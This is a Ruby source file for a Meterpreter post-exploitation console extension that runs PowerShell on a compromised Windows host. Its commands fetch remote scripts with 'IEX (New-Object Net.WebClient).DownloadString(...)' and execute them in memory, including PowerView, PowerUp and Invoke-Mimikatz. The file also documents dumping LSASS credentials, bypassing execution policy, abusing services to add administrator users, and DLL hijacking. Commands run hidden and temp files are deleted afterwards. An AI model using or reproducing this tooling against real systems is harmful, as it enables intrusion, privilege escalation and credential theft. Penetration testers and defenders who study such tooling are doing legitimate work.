# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The password database portion of the privilege escalation extension.
#
###
class Console::CommandDispatcher::Priv::PowerShell

  Klass = Console::CommandDispatcher::Priv::PowerShell

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      "power_shell" => "Execute a powershell command.",
      "power_view"  => "Download and execute Veil's PowerView Framework",
      "power_up"    => "Download and execute the PowerUp Framework",
      "power_katz"  => "Invoke-Mimikatz into memory using PowerShell",
      "power_scan"  => "Invoke-PortScan from meterpreter using PowerShell"
    }
  end

  POWER_VIEW_USAGE = %q{
Veil PowerView
==============
Ref: https://github.com/Veil-Framework/Veil-PowerView

== Commands ==
> power_view Get-HostIP 
  => It retrieves the local IP of the target.

> power_view Get-NetDomainControllers -domain ACME 
  => Gets domain controllers. Replacement for nslookup.  

> power_view Invoke-UserHunter -Domain 'ACME'
  => Gets all machines where domain admins are logged in

> power_view Invoke-ShareFinder -Domain ACME -Ping/-NoPing -Delay 60 -HostList Optional.txt
  => Locate shares across the domain. Best to supply domain and test ping settings

> power_view Invoke-FindLocalAdminAccess -Domain ACME -Delay 60 -Hostlist optional.txt 
  => Search domain to find where local user has access. HostList is optional.

> power_view Invoke-ComputerFieldSearch -Field info -Term badge
  => Searches all AD description fields for the defined words

> power_view -t X Invoke-Netview -Domain ACME -ping/-noping 
  => Runs Mubix's Net_view looking find all computers, 
  => then find open shares and who is logged on. Timing 120 is a good start. (-t 120) 

> power_view -t X Invoke-EnumerateLocalAdmins 
 => Enumerates members of the local Administrators groups
 => across all machines in the domain. 
 => options: (-ping, -noping, -Domain, -outfile, -Jitter, -delay, -hostlist) 

> power_view Invoke-MapDomainTrusts
 => This function gets all trusts for the current domain,
 => and tries to get all trusts for each domain it finds.
}

  POWER_SHELL_USAGE = %q{
Direct PowerShell Command
=========================
Desc: Runs commands directly into target Powershell provider. 

== Commands ==
> power_shell Get-Process
  => Gets All Local Processes

> power_shell Get-Process Winlogon,explorer | format-list * 
  => Needs description.

> power_shell Stop-Process -id XX -Force  
  => Needs description.

> power_shell Stop-Process -name notepad
  => Needs description.
}

  POWER_KATZ_USAGE = %q{
Powershell In-Memory Mimikatz
=============================
Desc: This runs Mimikatz in memory using Mimikatz 2.0 and Invoke-ReflectivePEInjection.
Ref: https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
Note: Works on anything Windows 8.1 and higher. For now, migrate into appropriate process manually.

== Commands ==
> power_katz -dumpCreds
  => dumps creds from LSASS

> power_katz -dumpCerts 
  => Dumps certificates from memory

> power_katz -DumpCreds -ComputerName @("computer1", "computer2")
  => Runs against multiple targets
}

 POWER_SCAN_USAGE = %q{
Powershell Invoke-Portscan from Memory
=============================
Desc: This is a loose implementation of nmap using powershell.
Ref:  https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1

== Commands ==
> power_scan -hosts (Comma seperated) -ports -PingOnly -Threads -oN file
  => Performs a basic scan and outputs to file

}

  POWER_UP_USAGE = %q{
Harmj0y PowerUp Utility
=======================
Desc: PowerUP is used to maintain persistence, bypass UAC, and elevate privilages.
Ref: https://github.com/HarmJ0y/PowerUp

== Commands ==
* Service Enumeration: 
> power_up Get-ServiceUnquoted
  => returns services with unquoted paths that also have a space in the name

> power_up Get-ServiceEXEPerms
  => returns services where the current user can write to the service binary path

> power_up Get-ServicePerms
  => returns services the current user can modify
 
* Service Abuse: 
> power_up Invoke-ServiceUserAdd
  => modifies a modifiable service to create a user and add it to the local administrators

> power_up Write-UserAddServiceBinary
  => writes out a patched C# service binary that adds a local administrative user

> power_up Write-ServiceEXE
  => replaces a service binary with one that adds a local administrator user

> power_up Restore-ServiceEXE
  => restores a replaced service binary with the original executable

* DLL Hijacking: 
> power_up Invoke-FindDLLHijack
  => finds DLL hijacking opportunities for currently running processes

> power_up Invoke-FindPathDLLHijack
  => finds service %PATH% .DLL hijacking opportunities

* Registry Checks:
> power_up Get-RegAlwaysInstallElevated
  => checks if the AlwaysInstallElevated registry key is set

> power_up Get-RegAutoLogon
  => checks for Autologon credentials in the registry

* Misc. Checks:
> power_up Get-UnattendedInstallFiles
  => finds remaining unattended installation files

* Helpers:
> power_up Invoke-AllChecks
  => runs all current escalation checks and returns a report

> power_up Write-UserAddMSI
  => write out a MSI installer that prompts for a user to be added

> power_up Invoke-ServiceStart
  => starts a given service

> power_up Invoke-ServiceStop
  => stops a given service

> power_up Invoke-ServiceEnable
  => enables a given service

> power_up Invoke-ServiceDisable
  => disables a given service

> power_up Get-ServiceDetails
  => returns detailed information about a service
}

  @@command_opts = Rex::Parser::Arguments.new(
    "-o" => [true, "Select a location to send command output to."],
    "-t" => [true, "The arguments to pass to the command."],
    "-h" => [false, "Help menu."]
  )

  #
  # Name for this dispatcher.
  #
  def name
    "Interactive Powershell"
  end

  #
  # HELPER: Sets up the command.
  #
  def ps_setup(args, &block)
    output_file = nil
    c_time      = 10
    @@command_opts.parse(args) do |opt, idx, val|
      case opt
      when '-o'
        output_file = val
        2.times { args.shift }
      when '-t'
        begin
          c_time = Integer(val)
          print_warning("Output timeout: #{val} seconds")
          2.times { args.shift }
        rescue
          print_error "#{val} is not a valid Integer."
          return false
        end
      when '-h'
        yield if block_given?
      end
    end  
    output   = "#{rand(1000000)}"
    ps_cmd   = args.join(" ")
    tmp_dir  = client.fs.file.expand_path("%temp%")
    tmp_file = "#{tmp_dir}\\#{output}"

    return output_file, c_time, ps_cmd, tmp_file
  end

  #
  # HELPER: Executes powershell on the host.
  #
  def ps_exec(command, tmp_file, c_time, output_file)
    encoding_options = {
      :invalid           => :replace,  # Replace invalid byte sequences
      :undef             => :replace,  # Replace anything not defined in ASCII
      :replace           => '',        # Use a blank for those replacements
      :universal_newline => false       # Always break lines with \n
    }
    print_status("Sending command to client...")
    client.sys.process.execute(command, nil, {'Hidden' => 'true', 'Channelized' => true})
    sleep(c_time)
    log_file = client.fs.file.new(tmp_file, "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data.encode(::Encoding.find('ASCII'), encoding_options))
      end
    rescue EOFError
    ensure
      log_file.close
    end
    client.sys.process.execute("cmd /c del #{tmp_file}", nil, {'Hidden' => 'true', 'Channelized' => true})
  end

  #
  # Direct PowerShell Commands
  #
  def cmd_power_shell(*args)
    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
      print_line(POWER_SHELL_USAGE)
      print_line("-" * 60)
      print("Usage: power_shell [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
            "Runs a direct Powershell command.\n" +
            @@command_opts.usage)
      return true
    end
    command = "powershell -nop -exec bypass -c #{ps_cmd} >> #{tmp_file}"
    ps_exec(command, tmp_file, c_time, output_file)
    return true
  end

  # 
  # PowerView Framework
  #
  def cmd_power_view(*args)
    link = 'https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'
    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
      print_line(POWER_VIEW_USAGE)
      print_line("-" * 60)
      print("Usage: power_view [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
            "Runs the Veil PowerView framework on the remote host.\n" +
            @@command_opts.usage)
      return true
    end
    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> #{tmp_file}"
    ps_exec(command, tmp_file, c_time, output_file)
    return true    
  end

  #
  # PowerUp Framework
  #
  def cmd_power_up(*args)
    link = 'https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'
    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
      print_line(POWER_UP_USAGE)
      print_line("-" * 60)
      print("Usage: power_up [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
            "Runs Harmj0y's PowerUp framework on the remote host.\n" +
            @@command_opts.usage)
      return true
    end
    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> #{tmp_file}"
    ps_exec(command, tmp_file, c_time, output_file)
    return true        
  end
 
  
  #
  # PowerShell Portscan using Powersploit
  #  https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1
    def cmd_power_scan(*args)
    link = 'https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1'
    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
      print_line(POWER_KATZ_USAGE)
      print_line("-" * 60)
      print("Usage: power_scan -Hosts/-HostsFile -Ports/-PortsFile/-topPorts -threads -oA file \n" +
            "A nmap style implementation in powershell.\n" +
            @@command_opts.usage)
      return true
    end
    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Portscan #{ps_cmd}\" >> #{tmp_file}"
    ps_exec(command, tmp_file, c_time, output_file)
    return true            
  end


  #
  # PowerShell Mimikatz
  #
  def cmd_power_katz(*args)
    link = 'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'
    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
      print_line(POWER_KATZ_USAGE)
      print_line("-" * 60)
      print("Usage: power_katz [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
            "Downloads and executes Mimikatz in memory through Powershell.\n" +
            @@command_opts.usage)
      return true
    end
    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> #{tmp_file}"
    ps_exec(command, tmp_file, c_time, output_file)
    return true            
  end

end

end
end
end
end

